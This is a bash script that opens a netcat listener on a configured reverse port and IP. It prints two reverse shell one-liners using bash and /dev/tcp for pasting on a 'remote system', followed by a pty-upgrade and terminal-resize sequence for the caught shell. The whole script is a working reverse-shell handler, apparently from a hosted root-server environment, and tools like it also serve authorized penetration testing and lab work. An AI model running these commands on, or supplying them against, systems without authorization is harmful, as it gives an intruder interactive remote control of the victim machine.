#! /usr/bin/env bash

source /sf/bin/funcs.sh

load() {
    [[ ! -f "$2" ]] && return 255
    eval "${1}=$(<"$2")"
}

ERREXIT() {
    local code="$1"

    shift 1
    [[ -n $1 ]] && echo -e >&2 "${CR}ERROR:${CN} $*"

    exit "${code:-99}"
}

[[ ! -f /config/self/reverse_port ]] && curl sf/port
load rport /config/self/reverse_port || ERREXIT 255 "No reverse port found. Try ${CC}curl sf/port${CN}."
load rip /config/self/reverse_ip || ERREXIT 255 "No reverse port found. Try ${CC}curl sf/port${CN}."
echo -e "\
Use one of these commands on the remote system:
    1. ${CDR}bash -c '(exec bash -i &>/dev/tcp/${rip}/${rport} 0>&1) &'${CN}
    2. ${CDR}(bash -i &>/dev/tcp/${rip}/${rport} 0>&1) &${CN}
${CN}Once connected, cut & paste the following into the _this_ shell:
${CF}-------------------------------------------------------------------------------${CDC}
command -v python >/dev/null \\
    && exec python -c 'import pty; pty.spawn(\"bash\")' \\
    || exec script -qc bash /dev/null
export SHELL=/bin/bash TERM=xterm-256color
reset -I
PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'
"'stty -echo;printf "\\033[18t";read -rdt R;stty sane $(echo "$R"|awk -F";" '"'"'{ printf "rows "$3" cols "$2; }'"'"')'"
${CN}${CF}-------------------------------------------------------------------------------${CN}
To force-exit this listener, type ${CDY}kill \"\$(pgrep -P $$)\"${CN} on your Root Server"
# PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '

cfg=$(stty --save)
stty raw  -echo opost
echo -e "${CDG}Listening on ${CG}${rip}:${rport}${CN}"
nc -nlp "$rport"
echo "ðŸ¦‹ Restoring terminal..."
stty "$cfg"
# reset -I

